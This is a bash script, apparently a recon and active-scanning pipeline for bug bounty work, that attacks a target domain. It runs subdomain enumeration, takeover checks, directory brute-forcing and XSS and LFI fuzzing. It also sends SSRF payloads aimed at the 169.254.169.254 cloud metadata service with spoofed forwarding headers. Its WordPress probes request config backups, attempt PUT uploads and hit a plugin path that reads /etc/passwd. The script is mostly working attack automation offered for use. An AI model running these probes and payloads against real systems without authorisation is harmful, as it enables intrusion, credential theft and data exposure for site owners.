#!/bin/bash

# ==========================
# Colors
# ==========================
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
NC="\e[0m" # No Color

# time
START_TIME=$(date +%s)

# if you want to skip any tool click ctrl+c once
SKIP_CURRENT=0
trap 'SKIP_CURRENT=1' SIGINT

# ==========================
# Usage check
# ==========================
if [ -z "$1" ]; then
    echo -e "${RED}Usage: $0 <domain-or-url> [subdomain_list_file]${NC}"
    echo -e "${YELLOW}Example:"
    echo -e "  $0 example.com"
    echo -e "  $0 https://example.com/v2/bb/hh"
    echo -e "  $0 example.com subdomains.txt${NC}"
    exit 1
fi

INPUT=$1
SUBDOMAIN_LIST=$2  # Optional second argument for subdomain list file

# ==========================
# Parse Input Domain and Base URL
# ==========================
if [[ "$INPUT" =~ ^https?:// ]]; then
    BASE_DOMAIN=$(echo "$INPUT" | awk -F[/:] '{print $4}')
    BASE_URL="$INPUT"
else
    BASE_DOMAIN="$INPUT"
    BASE_URL="https://$BASE_DOMAIN"
fi

OUTDIR="recon-$BASE_DOMAIN"
mkdir -p "$OUTDIR"

LOGFILE="$OUTDIR/enumz.log"
exec > >(tee -a "$LOGFILE") 2>&1

# ==========================
# Utility Functions
# ==========================
find_wordlist() {
    local primary="$1"
    local fallbacks=("$@")

    for wordlist in "${fallbacks[@]}"; do
        if [ -f "$wordlist" ]; then
            echo "$wordlist"
            return 0
        fi
    done
    return 1
}

# Simple rate limiting
rate_limit() {
    sleep 0.5  # 500ms delay between requests
}

# Main wordlist with fallbacks
WORDLIST=$(find_wordlist \
    "/root/SecLists/Discovery/DNS/subdomains-top1million-110000.txt" \
    "/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt" \
    "/opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt" \
    "/home/kali/SecLists/Discovery/DNS/subdomains-top1million-110000.txt" \
    "/usr/share/wordlists/dnsmap.txt" \
    "/usr/share/wordlists/subdomains.txt")

# ==========================
# Validate Dependencies
# ==========================
for tool in subfinder findomain ffuf httpx subzy katana arjun dirb curl; do
    if ! command -v "$tool" &> /dev/null; then
        echo -e "${RED}[!] $tool is not installed or not in PATH.${NC}"
        read -p "Do you want to try to install $tool automatically? [y/N]: " INSTALL
        if [[ "$INSTALL" =~ ^[Yy]$ ]]; then
            if command -v apt &>/dev/null; then
                sudo apt update && sudo apt install -y "$tool"
            elif command -v brew &>/dev/null; then
                brew install "$tool"
            else
                echo -e "${RED}[!] No supported package manager found. Please install $tool manually.${NC}"
                exit 1
            fi
        else
            echo -e "${RED}[!] Please install $tool and re-run the script.${NC}"
            exit 1
        fi
    fi
done

# ==========================
# Validate Wordlists
# ==========================
echo -e "${BLUE}[+] Checking wordlists...${NC}"
if [ -z "$WORDLIST" ]; then
    echo -e "${RED}[!] No suitable subdomain wordlist found.${NC}"
    echo -e "${YELLOW}[!] Please install SecLists or provide a custom wordlist.${NC}"
    exit 1
fi
echo -e "${GREEN}[+] Using wordlist: $WORDLIST${NC}"
sleep 2

# ==========================
# Checkpoint/resume logic
# ==========================
CHECKPOINT_FILE="checkpoint_$BASE_DOMAIN.txt"

set_checkpoint() {
    echo "$1" > "$CHECKPOINT_FILE"
}

skip_to_phase() {
    if [ -f "$CHECKPOINT_FILE" ]; then
        LAST_PHASE=$(cat "$CHECKPOINT_FILE")
        if [ "$LAST_PHASE" = "$1" ]; then
            # Remove checkpoint so next phase runs
            rm -f "$CHECKPOINT_FILE"
            return 0
        else
            return 1
        fi
    fi
    return 0
}

# Resume prompt if checkpoint exists
if [ -d "$OUTDIR" ] && [ -f "$CHECKPOINT_FILE" ]; then
    echo -e "${YELLOW}[!] Previous scan detected for $BASE_DOMAIN.${NC}"
    echo -e "${YELLOW}    1) Resume from last checkpoint${NC}"
    echo -e "${YELLOW}    2) Start new scan (delete previous output)${NC}"
    echo -e "${YELLOW}    3) Exit${NC}"
    read -p "Choose [1/2/3]: " CHOICE
    case "$CHOICE" in
        1) echo -e "${GREEN}[+] Resuming scan...${NC}" ;;
        2) echo -e "${YELLOW}[!] Deleting old output and checkpoint...${NC}"; rm -rf "$OUTDIR" "$CHECKPOINT_FILE"; mkdir -p "$OUTDIR" ;;
        *) echo -e "${RED}Exiting.${NC}"; exit 0 ;;
    esac
fi

# ==========================
# Recon Phase (Subdomain Enumeration or Load List)
# ==========================
skip_to_phase "recon" || { echo -e "${YELLOW}[!] Skipping Recon Phase (already completed)${NC}"; }

if [ -n "$SUBDOMAIN_LIST" ]; then
    if [ -f "$SUBDOMAIN_LIST" ]; then
        echo -e "${BLUE}[+] Loading subdomains from list: $SUBDOMAIN_LIST${NC}"
        cp "$SUBDOMAIN_LIST" "$OUTDIR/allsubs.txt"
    else
        echo -e "${RED}[!] Subdomain list file not found: $SUBDOMAIN_LIST${NC}"
        exit 1
    fi
else
    echo -e "${BLUE}[+] Whois Lookup...${NC}"
    whois "$BASE_DOMAIN" | tee "$OUTDIR/whois.txt" 2> "$OUTDIR/whois_errors.log"

    echo -e "${BLUE}[+] Running Subfinder...${NC}"
    sleep 2
    subfinder -d "$BASE_DOMAIN" -silent -o "$OUTDIR/subs.txt"
    echo -e "${GREEN}[+] Subfinder found: $(wc -l < "$OUTDIR/subs.txt") subs${NC}"

    echo -e "${BLUE}[+] Running Findomain...${NC}"
    sleep 2
    findomain -t "$BASE_DOMAIN" -u "$OUTDIR/findomain.txt"
    echo -e "${GREEN}[+] Findomain found: $(wc -l < "$OUTDIR/findomain.txt") subs${NC}"

    echo -e "${BLUE}[+] Running Ffuf for subdomain fuzzing...${NC}"
    sleep 2
    ffuf -u http://FUZZ.$BASE_DOMAIN -w "$WORDLIST" -mc 200,301,302,403,401 -of csv -o "$OUTDIR/ffufraw.csv" -t 50 -v
    if [ -f "$OUTDIR/ffufraw.csv" ]; then
        awk -F ',' -v domain="$BASE_DOMAIN" 'NR>1 {print $1"."domain}' "$OUTDIR/ffufraw.csv" > "$OUTDIR/ffuf.txt"
        echo -e "${GREEN}[+] Ffuf found: $(wc -l < "$OUTDIR/ffuf.txt") subs${NC}"
    else
        echo -e "${YELLOW}[!] Ffuf failed to produce output.${NC}"
    fi

    # Merge all subdomain sources
    cat "$OUTDIR/subs.txt" "$OUTDIR/findomain.txt" "$OUTDIR/ffuf.txt" | sort -u > "$OUTDIR/allsubs.txt"
    echo -e "${GREEN}[+] Total unique subdomains (merged): $(wc -l < "$OUTDIR/allsubs.txt")${NC}"
fi

# ==========================
# Make full URLs list for scanning with paths
# ==========================
PATH_PART=$(echo "$INPUT" | sed -n 's|^https\?://[^/]*\(.*\)$|\1|p')
if [ -z "$PATH_PART" ]; then
    PATH_PART="/"
fi

awk -v path="$PATH_PART" '{print "https://" $0 path}' "$OUTDIR/allsubs.txt" > "$OUTDIR/allsubs_fullurls.txt"

# ==========================
# Run httpx on full URLs list (with paths)
# ==========================
echo -e "${BLUE}[+] Running Httpx on full URLs list (with paths)...${NC}"
sleep 2
httpx -l "$OUTDIR/allsubs_fullurls.txt" -status-code -title -tech-detect -o "$OUTDIR/livesubs.txt"
echo -e "${GREEN}[+] Alive subdomains with full path: $(wc -l < "$OUTDIR/livesubs.txt")${NC}"
set_checkpoint "recon"

# ==========================
# Subdomain Takeover
# ==========================
skip_to_phase "subdomain takeover" || { echo -e "${YELLOW}[!] Skipping sub takeover Phase (already completed)${NC}"; }
echo -e "${BLUE}[+] Checking for Subdomain Takeover with Subzy...${NC}"
sleep 2
subzy run --targets "$OUTDIR/allsubs.txt" --concurrency 100 --hide_fails --verify_ssl | tee "$OUTDIR/subzy_results.txt"
echo -e "${GREEN}[+] Subdomain takeover check complete. Results saved to subzy_results.txt${NC}"
set_checkpoint "subdomain takeover"

# ==========================
# Crawling & JS
# ==========================
skip_to_phase "crawling" || { echo -e "${YELLOW}[!] Skipping Crawling Phase (already completed)${NC}"; }
echo -e "${BLUE}[+] Crawling with Katana on ALL subs (live + dead)...${NC}"
sleep 2
katana -list "$OUTDIR/allsubs_fullurls.txt" -o "$OUTDIR/urls.txt"

echo -e "${BLUE}[+] Extracting ALL JS files...${NC}"
grep -Eo 'https?://[^ ]+\.js' "$OUTDIR/urls.txt" > "$OUTDIR/js.txt"
echo -e "${GREEN}[+] Extracted $(wc -l < "$OUTDIR/js.txt") JS references${NC}"

echo -e "${BLUE}[+] Running Mantra on JS files...${NC}"
sleep 2
if [ -s "$OUTDIR/js.txt" ]; then
    if command -v mantra &> /dev/null; then
        cat "$OUTDIR/js.txt" | mantra | tee "$OUTDIR/mantra.txt"
        echo -e "${GREEN}[+] Mantra results saved to mantra.txt${NC}"
    else
        echo -e "${YELLOW}[!] Mantra is not installed. Skipping.${NC}"
    fi
else
    echo -e "${YELLOW}[!] No JS files found, skipping Mantra.${NC}"
fi
set_checkpoint "crawling"

# ==========================
# Sensitive Files
# ==========================
skip_to_phase "sensitive files" || { echo -e "${YELLOW}[!] Skipping Sensitive Files Phase (already completed)${NC}"; }
echo -e "${BLUE}[+] Searching for sensitive files...${NC}"
grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5)" "$OUTDIR/urls.txt" | tee "$OUTDIR/sensitive_files.txt"
echo -e "${GREEN}[+] Sensitive files found: $(wc -l < "$OUTDIR/sensitive_files.txt")${NC}"
set_checkpoint "sensitive files"

# ==========================
# Parameter Discovery
# ==========================
skip_to_phase "parameter discovery" || { echo -e "${YELLOW}[!] Skipping Parameter Discovery Phase (already completed)${NC}"; }
echo -e "${BLUE}[+] Running Arjun for parameter discovery...${NC}"
sleep 2
: > "$OUTDIR/arjun_params.txt"

while read -r url; do
    if [ "$SKIP_CURRENT" -eq 1 ]; then
        echo -e "${YELLOW}[!] Skipping rest of this phase due to Ctrl+C${NC}"
        SKIP_CURRENT=0
        break
    fi
    if [[ "$url" =~ [\[\]] ]]; then
        echo -e "${YELLOW}[!] Skipping malformed URL: $url${NC}"
        continue
    fi
    if [[ ! "$url" =~ ^https?:// ]]; then
        url="https://$url"
    fi
    echo -e "${YELLOW}[*] Scanning: $url${NC}"
    arjun -u "$url" -oT - >> "$OUTDIR/arjun_params.txt" || echo -e "${RED}[!] Arjun failed for: $url${NC}"
    rate_limit
done < "$OUTDIR/livesubs.txt"

echo -e "${GREEN}[+] Arjun params saved to arjun_params.txt${NC}"
set_checkpoint "parameter discovery"

# ==========================
# DirBuster + FFUF (Content Discovery)
# ==========================
skip_to_phase "content discovery" || { echo -e "${YELLOW}[!] Skipping Content Discovery Phase (already completed)${NC}"; }
echo -e "${BLUE}[+] Running DirBuster...${NC}"
sleep 2
while read -r url; do
    if [ "$SKIP_CURRENT" -eq 1 ]; then
        echo -e "${YELLOW}[!] Skipping rest of this phase due to Ctrl+C${NC}"
        SKIP_CURRENT=0
        break
    fi
    DIRB_WORDLIST=$(find_wordlist \
        "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" \
        "/usr/share/wordlists/dirb/common.txt" \
        "/usr/share/wordlists/dirb/big.txt" \
        "/usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt")
    if [ -n "$DIRB_WORDLIST" ]; then
        dirb "$url" -w "$DIRB_WORDLIST" -o "$OUTDIR/dirb_$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g').log"
    else
        echo -e "${YELLOW}[!] DirBuster wordlist not found: $DIRB_WORDLIST${NC}"
        echo -e "${YELLOW}[!] Skipping DirBuster for: $url${NC}"
    fi
done < "$OUTDIR/livesubs.txt"

echo -e "${BLUE}[+] Running FFUF for directories/files...${NC}"
sleep 2
while read -r url; do
    if [ "$SKIP_CURRENT" -eq 1 ]; then
        echo -e "${YELLOW}[!] Skipping rest of this phase due to Ctrl+C${NC}"
        SKIP_CURRENT=0
        break
    fi
    FFUF_WORDLIST=$(find_wordlist \
        "/root/SecLists/Discovery/Web-Content/common.txt" \
        "/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt" \
        "/opt/SecLists/Discovery/Web-Content/common.txt" \
        "/home/kali/SecLists/Discovery/Web-Content/common.txt" \
        "/usr/share/wordlists/dirb/common.txt" \
        "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt")
    if [ -n "$FFUF_WORDLIST" ]; then
        ffuf -w "$FFUF_WORDLIST" -u "$url/FUZZ" \
        -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 \
        -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db \
        -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" \
        -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-Host: localhost" \
        -t 100 -r -o "$OUTDIR/ffuf_dir_$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g').json"
    else
        echo -e "${YELLOW}[!] FFUF wordlist not found: $FFUF_WORDLIST${NC}"
        echo -e "${YELLOW}[!] Skipping FFUF content discovery for: $url${NC}"
    fi
done < "$OUTDIR/livesubs.txt"
echo -e "${GREEN}[+] Content discovery completed. Check dirb and ffuf outputs.${NC}"
set_checkpoint "content discovery"

# ==========================
# FFUF XSS Scan
# ==========================
skip_to_phase "xss" || { echo -e "${YELLOW}[!] Skipping xss scan Phase (already completed)${NC}"; }
echo -e "${BLUE}[+] Running FFUF for XSS testing (using Arjun params)...${NC}"
XSSWORDLIST=$(find_wordlist \
    "/root/SecLists/Fuzzing/XSS/human-friendly/XSS-payloadbox.txt" \
    "/usr/share/wordlists/xss-payloads.txt" \
    "/opt/wordlists/xss-payloads.txt" \
    "/home/kali/wordlists/xss-payloads.txt" \
    "/usr/share/wordlists/SecLists/Fuzzing/XSS/XSS-TestCases.txt")

if [ -z "$XSSWORDLIST" ]; then
    echo -e "${RED}[!] XSS wordlist not found: $XSSWORDLIST${NC}"
    echo -e "${YELLOW}[!] Skipping XSS fuzzing.${NC}"
elif [ -s "$OUTDIR/arjun_params.txt" ]; then
    while read -r url; do
        if [ "$SKIP_CURRENT" -eq 1 ]; then
            echo -e "${YELLOW}[!] Skipping rest of this phase due to Ctrl+C${NC}"
            SKIP_CURRENT=0
            break
        fi
        ffuf -u "${url}FUZZ" -w "$XSSWORDLIST" -mr "<script>alert('XSS')</script>" -t 50 -c -ac -of json -o "$OUTDIR/ffuf_xss_$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g').json"
        rate_limit
    done < "$OUTDIR/arjun_params.txt"
    echo -e "${GREEN}[+] XSS fuzzing completed. Results saved.${NC}"
else
    echo -e "${YELLOW}[!] No parameters found by Arjun, skipping XSS fuzzing.${NC}"
fi
set_checkpoint "xss"

# ==========================
# FFUF LFI Scan
# ==========================
skip_to_phase "lfi" || { echo -e "${YELLOW}[!] Skipping LFI scan Phase (already completed)${NC}"; }
echo -e "${BLUE}[+] Running FFUF for LFI testing (using Arjun params)...${NC}"
LFIWORDLIST=$(find_wordlist \
    "/root/SecLists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt" \
    "/usr/share/wordlists/offensive-payloads/LFI-payload.txt" \
    "/opt/wordlists/LFI-payload.txt" \
    "/home/kali/wordlists/LFI-payload.txt" \
    "/usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt")

if [ -z "$LFIWORDLIST" ]; then
    echo -e "${RED}[!] LFI wordlist not found: $LFIWORDLIST${NC}"
    echo -e "${YELLOW}[!] Skipping LFI fuzzing.${NC}"
elif [ -s "$OUTDIR/arjun_params.txt" ]; then
    while read -r url; do
        if [ "$SKIP_CURRENT" -eq 1 ]; then
            echo -e "${YELLOW}[!] Skipping rest of this phase due to Ctrl+C${NC}"
            SKIP_CURRENT=0
            break
        fi
        ffuf -u "${url}FUZZ" -w "$LFIWORDLIST" -mr "root:" -t 50 -c -ac -of json -o "$OUTDIR/ffuf_lfi_$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g').json"
        rate_limit
    done < "$OUTDIR/arjun_params.txt"
    echo -e "${GREEN}[+] LFI fuzzing completed. Results saved.${NC}"
else
    echo -e "${YELLOW}[!] No parameters found by Arjun, skipping LFI fuzzing.${NC}"
fi
set_checkpoint "lfi"

# ==========================
# CORS Misconfiguration Test (Improved)
# ==========================
skip_to_phase "cors" || { echo -e "${YELLOW}[!] Skipping CORS scan Phase (already completed)${NC}"; }
echo -e "${BLUE}[+] Testing for CORS misconfigurations with OPTIONS preflight requests...${NC}"
sleep 2

CORS_ENDPOINTS=(
    "/wp-json/"
    "/api/"
    "/graphql"
    "/rest/"
    "/v1/"
    "/oauth/"
    "/admin/"
    "/swagger/"
    "/user/"
    "/users/"
    "/account/"
    "/accounts/"
    "/login/"
    "/auth/"
    "/session/"
    "/sessions/"
    "/profile/"
    "/profiles/"
    "/dashboard/"
    "/data/"
    "/export/"
    "/import/"
    "/private/"
    "/internal/"
    "/public/"
    "/config/"
    "/settings/"
    "/setup/"
    "/test/"
    "/dev/"
    "/debug/"
    "/health/"
    "/status/"
    "/monitor/"
    "/metrics/"
    "/info/"
    "/report/"
    "/reports/"
    "/search/"
    "/feed/"
    "/feeds/"
    "/static/"
    "/content/"
    "/cms/"
    "/editor/"
    "/manage/"
    "/management/"
    "/adminpanel/"
    "/cpanel/"
    "/console/"
    "/system/"
    "/api/v1/"
    "/api/v2/"
    "/api/v3/"
    "/api/v4/"
    "/api/v5/"
)

while read -r url; do
    if [ "$SKIP_CURRENT" -eq 1 ]; then
        echo -e "${YELLOW}[!] Skipping rest of this phase due to Ctrl+C${NC}"
        SKIP_CURRENT=0
        break
    fi
    for endpoint in "${CORS_ENDPOINTS[@]}"; do
        full_url="${url}${endpoint}"
        echo -e "${YELLOW}[*] Checking CORS on: $full_url${NC}"
        cors_result=$(curl -s -X OPTIONS -H "Origin: http://example.com" -H "Access-Control-Request-Method: GET" -I "$full_url" \
            | grep -i -e "access-control-allow-origin" -e "access-control-allow-methods" -e "access-control-allow-credentials")
        if [ -n "$cors_result" ]; then
            echo "$full_url: $cors_result" >> "$OUTDIR/cors_results.txt"
        fi
        rate_limit
    done
done < "$OUTDIR/livesubs.txt"
echo -e "${GREEN}[+] CORS testing finished.${NC}"
set_checkpoint "cors"

# ==========================
# SSRF Testing
# ==========================
skip_to_phase "ssrf" || { echo -e "${YELLOW}[!] Skipping SSRF scan Phase (already completed)${NC}"; }
echo -e "${BLUE}[+] Building SSRF/Open-Redirect candidate list from crawled URLs...${NC}"
cat "$OUTDIR/urls.txt" | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u | tee "$OUTDIR/ssrf_candidates.txt"
echo -e "${GREEN}[+] Candidates written to ssrf_candidates.txt ($(wc -l < "$OUTDIR/ssrf_candidates.txt"))${NC}"

echo -e "${BLUE}[+] Testing for SSRF with metadata endpoint payload...${NC}"
SSRF_PAYLOAD="http://169.254.169.254/latest/meta-data/"
SSRF_PAYLOAD_ESC=$(printf '%s' "$SSRF_PAYLOAD" | sed 's/[\/&]/\\&/g')

if [ -s "$OUTDIR/arjun_params.txt" ]; then
    while read -r purl; do
        if [ "$SKIP_CURRENT" -eq 1 ]; then
            echo -e "${YELLOW}[!] Skipping rest of this phase due to Ctrl+C${NC}"
            SKIP_CURRENT=0
            break
        fi
        test_url="${purl}${SSRF_PAYLOAD}"
        echo -e "${YELLOW}[*] SSRF test (Arjun): $test_url${NC}"
        ssrf_result=$(curl -s -L "$test_url" -H "Host: 169.254.169.254" -H "X-Forwarded-Host: 169.254.169.254" -H "X-Forwarded-For: 169.254.169.254" -H "X-Client-IP: 169.254.169.254" | head -n 10)
        if [ -n "$ssrf_result" ] && [[ "$ssrf_result" =~ (ami-id|instance-id|security-groups) ]]; then
            echo "POTENTIAL SSRF: $test_url" >> "$OUTDIR/ssrf_results.txt"
            echo "$ssrf_result" >> "$OUTDIR/ssrf_results.txt"
            echo "---" >> "$OUTDIR/ssrf_results.txt"
        fi
        rate_limit
    done < "$OUTDIR/arjun_params.txt"
else
    echo -e "${YELLOW}[!] No Arjun params; skipping Arjun-based SSRF tests.${NC}"
fi

if [ -s "$OUTDIR/ssrf_candidates.txt" ]; then
    while read -r cand; do
        if [ "$SKIP_CURRENT" -eq 1 ]; then
            echo -e "${YELLOW}[!] Skipping rest of this phase due to Ctrl+C${NC}"
            SKIP_CURRENT=0
            break
        fi
        injected=$(echo "$cand" | sed -E "s/(url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=)[^&#]*/\1$SSRF_PAYLOAD_ESC/gI")
        echo -e "${YELLOW}[*] SSRF test (candidates): $injected${NC}"
        ssrf_result=$(curl -s -L "$injected" -H "Host: 169.254.169.254" -H "X-Forwarded-Host: 169.254.169.254" -H "X-Forwarded-For: 169.254.169.254" -H "X-Client-IP: 169.254.169.254" | head -n 10)
        if [ -n "$ssrf_result" ] && [[ "$ssrf_result" =~ (ami-id|instance-id|security-groups) ]]; then
            echo "POTENTIAL SSRF: $injected" >> "$OUTDIR/ssrf_results.txt"
            echo "$ssrf_result" >> "$OUTDIR/ssrf_results.txt"
            echo "---" >> "$OUTDIR/ssrf_results.txt"
        fi
        rate_limit
    done < "$OUTDIR/ssrf_candidates.txt"
else
    echo -e "${YELLOW}[!] No SSRF candidates from crawl; skipping candidate-based SSRF tests.${NC}"
fi
echo -e "${GREEN}[+] SSRF checks completed.${NC}"
set_checkpoint "ssrf"

# ==========================
# WordPress Active Scan
# ==========================
skip_to_phase "wordpress scan" || { echo -e "${YELLOW}[!] Skipping WordPress scan Phase (already completed)${NC}"; }
echo -e "${BLUE}[+] Starting WordPress active scan...${NC}"

WP_USER_EXPOSURE_PATHS=(
    "/wp-json/wp/v2/users"
    "/wp-json/?rest_route=/wp/v2/users/"
    "/wp-json/?rest_route=/wp/v2/users/n"
    "/index.php?rest_route=/wp-json/wp/v2/users"
    "/index.php?rest_route=/wp/v2/users"
    "/author-sitemap.xml"
    "/wp-content/debug.log"
    "/wp-content/plugins/mail-masta/"
    "/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
    "/wp-content/uploads/wp-file-manager-pro/fm_backup/"
)

WP_COMMON_PATHS=(
    "/wp-login.php?action=register"
    "/wp-admin/login.php"
    "/wp-admin/wp-login.php"
    "/login.php"
    "/wp-login.php"
    "/wp-config.php"
    "/wp-config.php_"
    "/wp-config.php.BAK"
    "/tox.ini"
)

WP_UPLOAD_DIRS=(
    "/wp-content/uploads/"
    "/wp-content/UPLOADS/"
    "/wp-content/UpLoAds/"
)

WP_VERSION_471_PATHS=(
    "/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php"
)

wp_check_get() {
    local url=$1
    http_status=$(curl -s -o /dev/null -w "%{http_code}" "$url")
    echo "$url => Status: $http_status"
}

wp_check_put() {
    local url=$1
    http_status=$(curl -s -o /dev/null -w "%{http_code}" -X PUT -T /dev/null "${url}testfile.txt")
    echo "$url (PUT) => Status: $http_status"
}

while read -r fullurl; do
    if [ "$SKIP_CURRENT" -eq 1 ]; then
        echo -e "${YELLOW}[!] Skipping rest of this phase due to Ctrl+C${NC}"
        SKIP_CURRENT=0
        break
    fi
    echo -e "${YELLOW}[*] Scanning WordPress endpoints on $fullurl${NC}"
    for path in "${WP_USER_EXPOSURE_PATHS[@]}"; do wp_check_get "${fullurl}${path}"; done
    for path in "${WP_COMMON_PATHS[@]}"; do wp_check_get "${fullurl}${path}"; done
    for path in "${WP_UPLOAD_DIRS[@]}"; do
        wp_check_get "${fullurl}${path}"
        wp_check_put "${fullurl}${path}"
    done
    for path in "${WP_VERSION_471_PATHS[@]}"; do wp_check_get "${fullurl}${path}"; done
done < "$OUTDIR/livesubs.txt" | tee "$OUTDIR/wordpress_scan_results.txt"

echo -e "${GREEN}[+] WordPress scan complete. Results saved in wordpress_scan_results.txt${NC}"
set_checkpoint "wordpress scan"

# ==========================
# Finished
# ==========================
END_TIME=$(date +%s)
ELAPSED=$((END_TIME - START_TIME))
echo -e "${GREEN}[+] Total elapsed time: ${ELAPSED} seconds${NC}"
echo -e "${YELLOW}[+] Recon & Active Scanning completed for $BASE_DOMAIN 🚀${NC}"
echo -e "${BLUE}========== SUMMARY ==========${NC}"
echo -e "${GREEN}Subdomains found: $(wc -l < "$OUTDIR/allsubs.txt")${NC}"
echo -e "${GREEN}Live subdomains: $(wc -l < "$OUTDIR/livesubs.txt")${NC}"
echo -e "${GREEN}Sensitive files: $(wc -l < "$OUTDIR/sensitive_files.txt" 2>/dev/null || echo 0)${NC}"
echo -e "${GREEN}JS files: $(wc -l < "$OUTDIR/js.txt" 2>/dev/null || echo 0)${NC}"
echo -e "${GREEN}Arjun params: $(wc -l < "$OUTDIR/arjun_params.txt" 2>/dev/null || echo 0)${NC}"
echo -e "${GREEN}SSRF candidates: $(wc -l < "$OUTDIR/ssrf_candidates.txt" 2>/dev/null || echo 0)${NC}"
echo -e "${GREEN}WordPress scan results: $(wc -l < "$OUTDIR/wordpress_scan_results.txt") entries${NC}"
echo -e "${BLUE}=============================${NC}"
echo -e "${GREEN}[+] All results are saved in $OUTDIR${NC}"
